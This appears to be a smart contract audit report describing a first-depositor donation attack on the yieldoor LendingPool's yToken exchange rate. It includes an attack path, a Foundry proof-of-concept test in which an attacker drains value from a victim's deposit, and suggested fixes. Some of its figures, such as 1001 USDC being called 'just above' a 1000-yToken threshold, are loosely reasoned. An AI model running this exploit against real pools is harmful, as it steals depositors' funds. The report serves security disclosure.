# Attacker will steal funds from new depositors through yToken exchange rate manipulation

## Summary
The insufficient first depositor protection in the LendingPool contract will cause financial losses for subsequent depositors as attackers will manipulate the yToken exchange rate through donation attacks.

## Root Cause
In [LendingPool.sol#L200-L220](https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/LendingPool.sol#L200-L220) the first depositor protection mechanism burns only 1000 yTokens, which is inadequate:

```solidity
function _deposit(address asset, uint256 amount, address onBehalfOf) internal returns (uint256 yTokenAmount) {
    // ... other code ...
    
    if (IyToken(reserve.yTokenAddress).totalSupply() == 0) {
        // Burn the first 1000 yToken, to defend against lp inflation attacks
        IyToken(reserve.yTokenAddress).mint(DEAD_ADDRESS, MINIMUM_YTOKEN_AMOUNT);
        
        yTokenAmount -= MINIMUM_YTOKEN_AMOUNT;
    }
    
    IyToken(reserve.yTokenAddress).mint(onBehalfOf, yTokenAmount);
    // ... other code ...
}
```

The vulnerability exists because the protection:
1. Burns an arbitrary and possibly insufficient amount (1000 yTokens) regardless of token decimals and value
2. Can be bypassed by directly transferring tokens to the yToken contract
3. Still allows manipulation of the exchange rate calculation in `reserveToYTokenExchangeRate`

## Internal Pre-conditions
1. A lending pool must be initialized with no existing deposits
2. The `MINIMUM_YTOKEN_AMOUNT` constant must be small enough to be bypassed
3. The `reserveToYTokenExchangeRate` function must calculate rates based on totalSupply() and totalLiquidity

## External Pre-conditions
1. The attacker must have access to sufficient capital to make the initial deposit and subsequent donation
2. The token being used must allow for direct transfers to the yToken contract address

## Attack Path
1. Attacker makes an initial small deposit (just above the MINIMUM_YTOKEN_AMOUNT threshold) to receive yTokens
2. Attacker directly transfers a large amount of the underlying token to the yToken contract without minting additional yTokens
3. This skews the exchange rate since there are now more underlying assets than represented by yTokens
4. When other users deposit, they receive fewer yTokens than they should due to the manipulated exchange rate
5. The attacker withdraws their yTokens at the inflated exchange rate, effectively stealing value from subsequent depositors

## Impact
Subsequent depositors receive fewer yTokens than they should for their deposits, resulting in direct financial losses proportional to the size of the donation and their deposit amount. When these users withdraw, they receive less than they deposited, while the attacker profits from the difference. The economic impact scales with the size of the donation and subsequent deposits.

## PoC
```solidity
function testFirstDepositorAttack() public {
    // Setup
    address attacker = address(0x1);
    address victim = address(0x2);
    
    // Step 1: Attacker makes a small initial deposit
    vm.startPrank(attacker);
    uint256 initialDeposit = 1001e6; // Just above the minimum threshold for USDC
    usdc.approve(address(lendingPool), initialDeposit);
    lendingPool.deposit(address(usdc), initialDeposit, attacker);
    
    // Step 2: Attacker directly transfers a large amount to the yToken contract without minting
    uint256 donationAmount = 999_000e6; // 999,000 USDC
    address yUsdcAddress = lendingPool.getYTokenAddress(address(usdc));
    usdc.transfer(yUsdcAddress, donationAmount);
    vm.stopPrank();
    
    // Check exchange rate is manipulated
    uint256 manipulatedRate = lendingPool.getExchangeRate(address(usdc));
    console.log("Manipulated exchange rate:", manipulatedRate); // Will be very small
    
    // Step 3: Victim deposits
    vm.startPrank(victim);
    uint256 victimDeposit = 10_000e6; // 10,000 USDC
    usdc.approve(address(lendingPool), victimDeposit);
    uint256 victimYTokens = lendingPool.deposit(address(usdc), victimDeposit, victim);
    console.log("Victim yTokens received:", victimYTokens); // Will be significantly less than expected
    vm.stopPrank();
    
    // Step 4: Attacker withdraws with inflated exchange rate
    vm.startPrank(attacker);
    // Calculate how many yTokens the attacker has
    uint256 attackerYTokens = IERC20(yUsdcAddress).balanceOf(attacker);
    // Withdraw all yTokens
    lendingPool.withdraw(address(usdc), attackerYTokens, attacker);
    // Check how much USDC the attacker received
    uint256 attackerFinalBalance = usdc.balanceOf(attacker);
    console.log("Attacker profit:", attackerFinalBalance - initialDeposit - donationAmount);
    vm.stopPrank();
    
    // Verify that the attacker has extracted value from the victim
    assert(attackerFinalBalance > initialDeposit + donationAmount);
}
```

## Mitigation
Implement a minimum initial deposit requirement:

```solidity
uint256 constant MINIMUM_FIRST_DEPOSIT = 10_000 * 1e6; // $10,000 worth for 6 decimal tokens

function _deposit(address asset, uint256 amount, address onBehalfOf) internal returns (uint256 yTokenAmount) {
    // ... existing code ...
    
    if (IyToken(reserve.yTokenAddress).totalSupply() == 0) {
        require(amount >= MINIMUM_FIRST_DEPOSIT, "First deposit too small");
        // ... rest of the code ...
    }
    
    // ... existing code ...
}
```

Or implement a virtual balance for exchange rate calculation:

```solidity
uint256 constant VIRTUAL_SHARES = 1_000_000 * 1e18; // 1 million shares
uint256 constant VIRTUAL_BALANCE = 1_000_000 * 1e6; // 1 million tokens (for 6 decimal tokens)

function reserveToYTokenExchangeRate(DataTypes.ReserveData storage reserve) internal view returns (uint256) {
    (uint256 totalLiquidity,) = totalLiquidityAndBorrows(reserve);
    uint256 totalYTokens = IERC20(reserve.yTokenAddress).totalSupply();
    
    if (totalYTokens == 0 || totalLiquidity == 0) {
        return PRECISION;
    }
    
    // Add virtual shares and balance to the calculation
    return (totalYTokens + VIRTUAL_SHARES) * PRECISION / (totalLiquidity + VIRTUAL_BALANCE);
}
```
